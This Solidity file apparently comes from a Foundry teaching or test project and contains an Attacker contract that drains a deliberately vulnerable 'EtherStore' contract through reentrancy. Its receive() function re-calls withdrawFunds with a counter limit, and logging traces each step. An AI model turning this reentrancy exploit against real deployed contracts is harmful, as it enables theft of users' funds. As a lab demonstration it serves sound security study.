// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "src/EtherStoreVulnerable.sol";

contract Attacker {
    EtherStoreVulnerable public etherStoreVulnerable;
    uint numberOfFallbacks;

    constructor(address _etherStoreVulnerableAddress) public {
        etherStoreVulnerable = EtherStoreVulnerable(_etherStoreVulnerableAddress);
    }

    function AttackEtherStore() public {
        require(address(this).balance >= 1 ether);
        etherStoreVulnerable.depositFunds{value: 1 ether}();
        etherStoreVulnerable.withdrawFunds(1 ether);
    }

    // Fallback function, where the magic happens
    receive() external payable {
        console.log("Fallback function called and %s balance: %d", address(etherStoreVulnerable), address(etherStoreVulnerable).balance);
        console.log("etherStoreVulnerable balance: %d for number of fallbacks: %d", etherStoreVulnerable.getBalance(), numberOfFallbacks);
        if (address(etherStoreVulnerable).balance > 1 ether && numberOfFallbacks <= 1) {
            numberOfFallbacks += 1;
            console.log("Fallback function calling etherStoreVulnerable.withdrawFunds.");
            etherStoreVulnerable.withdrawFunds(1 ether);
        }
    }

}